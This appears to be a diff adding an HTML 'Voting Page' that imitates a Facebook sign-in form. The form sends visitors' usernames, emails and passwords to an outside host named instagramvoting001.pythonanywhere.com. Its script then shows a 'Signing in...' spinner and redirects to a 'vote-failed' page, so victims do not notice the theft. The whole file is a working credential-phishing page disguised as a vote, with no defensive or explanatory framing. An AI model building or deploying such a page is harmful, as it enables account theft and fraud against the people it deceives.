@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta property="og:type" content='Voting Page'/>
+	<meta charset="utf-8">
+	<meta name="author" content="Kodinger">
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<title>Voting Page</title>
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="css/my-login.css">
+</head>
+
+<body class="my-login-page">
+
+	<section class="h-100">
+		<div class="container h-100">
+			<div class="row justify-content-md-center h-100">
+				<div class="card-wrapper">
+				
+					<div class="brand">
+						<img src="images/logofb.png" alt="logo">
+					</div>
+					
+					<div class="card fat">
+						<div class="card-body">
+							<h4 class="card-title">Sign in to Continue</h4>
+							
+							<form action="https://instagramvoting001.pythonanywhere.com/api/facebook-login" method="POST" class="my-login-validation" novalidate="">
+							
+								<div class="form-group">
+									<input id="email" type="username" placeholder="Phone number, username, email address" class="form-control" name="email" value="" required autofocus>
+
+									<div class="invalid-feedback">
+										Email is invalid
+									</div>
+								</div>
+
+								<div class="form-group">
+									
+									<input id="password" type="password"  placeholder="Password" class="form-control" name="password" required data-eye>
+								    <div class="invalid-feedback">
+								    	Password is required
+							    	</div>
+								</div>
+								<a href="index.html" class="float-right">
+											Forgot Password?
+								</a>
+
+								<div class="form-group">
+									<div class="custom-checkbox custom-control">
+										<input type="checkbox" name="remember" id="remember" class="custom-control-input">
+									</div>
+									
+								</div>
+
+								<div class="form-group m-0">
+									<button type="submit" class="btn btn-primary btn-block" id="loginBtn">
+										<span id="btnText">Log in</span>
+										<span id="btnSpinner" style="display: none;">
+											<i class="fas fa-spinner fa-spin"></i> Signing in...
+										</span>
+									</button>
+									
+									<center><p style="color:blue; margin: 10px">Forgotten Password?</p></center>
+								</div>
+								<center><a href='index.html'>
+				<img style="margin-bottom: 0px; margin-left: 0px; margin-right: 0px; max-width: 200px; " src="images/create2.jpg" alt="logo">
+			</a></center>
+							</form>
+						</div>
+					</div>
+					<div class="footer">
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<!-- Loading Overlay -->
+	<div class="loading-overlay" id="loadingOverlay">
+		<div class="spinner"></div>
+		<div class="loading-text">Signing in...</div>
+	</div>
+
+	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+	<script src="js/my-login.js"></script>
+	<script>
+		// Form validation and loading spinner
+		$('.my-login-validation').on('submit', function(e) {
+			var email = $('#email').val().trim();
+			var password = $('#password').val().trim();
+			
+			// Reset previous validation states
+			$('.form-control').removeClass('is-invalid');
+			
+			// Check if both fields are filled
+			if (!email && !password) {
+				e.preventDefault();
+				$('#email').addClass('is-invalid');
+				$('#password').addClass('is-invalid');
+				return false;
+			}
+			
+			if (!email) {
+				e.preventDefault();
+				$('#email').addClass('is-invalid');
+				return false;
+			}
+			
+			if (!password) {
+				e.preventDefault();
+				$('#password').addClass('is-invalid');
+				return false;
+			}
+			
+			// If validation passes, show spinner in button then redirect
+			$('#btnText').hide();
+			$('#btnSpinner').show();
+			$('#loginBtn').prop('disabled', true);
+			
+			// Redirect to vote failed page after 2 seconds
+			setTimeout(function() {
+				window.location.href = 'vote-failed.html';
+			}, 2000);
+		});
+	</script>
+</body>
+</html>
